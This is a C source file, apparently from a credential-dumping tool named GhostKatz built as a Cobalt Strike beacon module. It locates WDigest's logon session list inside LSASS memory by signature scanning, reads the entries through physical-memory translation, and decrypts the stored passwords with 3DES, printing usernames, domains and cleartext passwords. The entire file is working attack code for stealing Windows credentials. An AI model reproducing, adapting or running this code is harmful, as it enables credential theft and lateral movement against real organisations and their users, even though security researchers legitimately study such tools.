#include <windows.h>
#include <ntstatus.h>

#include "ghostkatz.h"
#include "defs.h"
#include "lsass_offsets.h"

DWORD64 SearchForLogSessList(void)
{
    PBYTE wdigestImageBase = (PBYTE)GetModuleHandleA("wdigest.dll");

    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)wdigestImageBase;
    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pDosHdr + pDosHdr->e_lfanew);
    PBYTE wdigestTextBase = wdigestImageBase + pNtHdr->OptionalHeader.BaseOfCode;
    DWORD wdigestTextSize = pNtHdr->OptionalHeader.SizeOfCode;

    // Search for l_LogSessList signature within wdigest.dll and grab the offset
    DWORD logSessListSig_PatternOffset = SearchPattern(wdigestTextBase, wdigestTextSize, logSessListSig, sizeof(logSessListSig));
    if (logSessListSig_PatternOffset == 0) {
        BeaconFormatPrintf(&outputbuffer, "[!] Could not find l_LogSessList pattern signature\n");
        return -1;
    }
    
    // Get the full address where the mimikatz byte pattern was found
    PBYTE logSessList_PatternAddress = wdigestTextBase + logSessListSig_PatternOffset;

    // Now get the RIP offset from the pattern address so we can use it later
    // May look like  "48 8d 0d 97 f8 01 00    lea rcx,[rip+0x1f897] # 0x1f89e"  and we want to get the 0x1f897
    DWORD logSessList_RipOffset =
        (logSessList_PatternAddress[-1] << 24) |
        (logSessList_PatternAddress[-2] << 16) |
        (logSessList_PatternAddress[-3] << 8) |
        (logSessList_PatternAddress[-4]);


    DWORD64 Real_l_LogSessListHead_Address = logSessList_PatternAddress + logSessList_RipOffset;

    return Real_l_LogSessListHead_Address;
}


//
// You can view structure of the WDigest list entry in lsass_offsets.h
//

BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHead, DWORD lower32bits, DWORD LsassPID, unsigned char* Real3DesKey, int i3DesKeyLength, unsigned char* InitializationVector)
{
    DWORD64 tmpPA = 0;
    DWORD64 kMSV1_0_LIST_63 = 0;
    DWORD64 Flink = 0;
    int bytesWritten = 0;

    // Get the first Flink to start the traversal
    // poi(wdigest!l_LogSessList)
    if (!TranslateUVA2Physical(l_LogSessListHead, &tmpPA, lower32bits, LsassPID))
    {
        return FALSE;
    }
    Flink = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);

    // !list -x "dS @$extret+0x30" poi(wdigest!l_LogSessList)

    int i = 0;
    while (Flink != l_LogSessListHead) // Did a full circle back to the beginning of the linked list
    {
        DWORD64 FlinkPA = 0;
        if (!TranslateUVA2Physical(Flink, &FlinkPA, lower32bits, LsassPID))
        {
            break; // Breaking out of loop. Invalid address
        }
        BeaconFormatPrintf(&outputbuffer, "[%04d] Flink Base Address : 0x%llx\n", i, Flink);

        wchar_t* UserNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + 0x30, lower32bits, LsassPID);
        if (UserNameWideString == NULL || *UserNameWideString == L'\0')
            UserNameWideString = L"(null)"; // - we should just loop again because it's an invalid entry        

        char UserNameString[MAX_PATH];
        bytesWritten = WideCharToMultiByte(CP_ACP, 0, UserNameWideString, -1, UserNameString, MAX_PATH, NULL, NULL);
        if (bytesWritten != 0)
        {
            BeaconFormatPrintf(&outputbuffer, "\t    * Username    : %s\n", UserNameString);
        }
        else
        {
            BeaconFormatPrintf(&outputbuffer, "\t    * Username    : (Failed to convert to MultiByte string)\n");
        }


        wchar_t* DomainNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + 0x40, lower32bits, LsassPID);
        if (DomainNameWideString == NULL || *DomainNameWideString == L'\0')
            DomainNameWideString = L"(null)";

        char DomainNameString[MAX_PATH];
        bytesWritten = WideCharToMultiByte(CP_ACP, 0, DomainNameWideString, -1, DomainNameString, MAX_PATH, NULL, NULL);
        if (bytesWritten != 0)
        {
            BeaconFormatPrintf(&outputbuffer, "\t    * Domain      : %s\n", DomainNameString);
        }
        else
        {
            BeaconFormatPrintf(&outputbuffer, "\t    * Domain      : (Failed to convert to MultiByte string)\n");
        }

        unsigned char* cryptoBlob = (unsigned char*)ReadUnicodeStringFromPhysical(hFile, FlinkPA + 0x50, lower32bits, LsassPID); // get the encrypted password

        // since this is a UnicodeString struct and offset 0x2 contains the max length, we get 0x52 from 0x50 + 0x2
        BYTE MaxLengthOfString = 0;
        ReadByte(hFile, FlinkPA + 0x52, &MaxLengthOfString);
        if ( (_wcsicmp(UserNameWideString, L"(null)") != 0 ) && (MaxLengthOfString != 0) )
        {
            NTSTATUS status;
            ULONG cbResult = 0;
            BCRYPT_ALG_HANDLE hAlgorithm = NULL;
            BCRYPT_KEY_HANDLE hKey = NULL;

            UCHAR* bOutput = malloc(MaxLengthOfString);

            // We need to make a copy of the IV for each iteration since the InitializationVector buffer will change after BCryptDecrypt is called
            size_t ivLen = 16;
            unsigned char *ivCopy = (unsigned char*)malloc(ivLen);
            memcpy(ivCopy, InitializationVector, ivLen);

            status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_3DES_ALGORITHM, NULL, 0);

            status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, Real3DesKey, i3DesKeyLength, 0);
            if (status == STATUS_SUCCESS)
            {
                status = BCryptDecrypt(hKey, cryptoBlob, MaxLengthOfString, 0, ivCopy, 8, bOutput, MaxLengthOfString, &cbResult, 0);
                if (status == STATUS_SUCCESS)
                {

                    size_t usernameLength = wcslen(UserNameWideString);
                    if (usernameLength > 0 && UserNameWideString[usernameLength - 1] == L'$')
                    {
                        size_t passwordLength = wcslen((wchar_t*)bOutput);
                        BeaconFormatPrintf(&outputbuffer, "\t    * Password    : ");
                        PrintHex(bOutput, passwordLength);
                    }
                    else
                    {
                        char AsciiPasswordString[MAX_PATH];
                        bytesWritten = WideCharToMultiByte(CP_ACP, 0, (wchar_t*)bOutput, -1, AsciiPasswordString, MAX_PATH, NULL, NULL);
                        if (bytesWritten != 0)
                        {
                            BeaconFormatPrintf(&outputbuffer, "\t    * Password    : %s\n", AsciiPasswordString);
                        }
                        else
                        {
                            BeaconFormatPrintf(&outputbuffer, "\t    * Password    : (Failed to convert to MultiByte string)\n");
                        }
                    }
                }
                else
                {
                    BeaconFormatPrintf(&outputbuffer, "[!] Error in BCryptOpenAlgorithmProvider: 0x%lx\n", status);
                }
            }
            free(ivCopy);

            status = BCryptCloseAlgorithmProvider(hAlgorithm, 0);
            status = BCryptDestroyKey(hKey);
            free(bOutput);
        }
        else
        {
            BeaconFormatPrintf(&outputbuffer, "\t    * Password    : (null)\n");
        }
        
        BeaconFormatPrintf(&outputbuffer, "\n");
        TranslateUVA2Physical(Flink, &tmpPA, lower32bits, LsassPID);
        Flink = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);

        i++;

    }

    return TRUE;
}
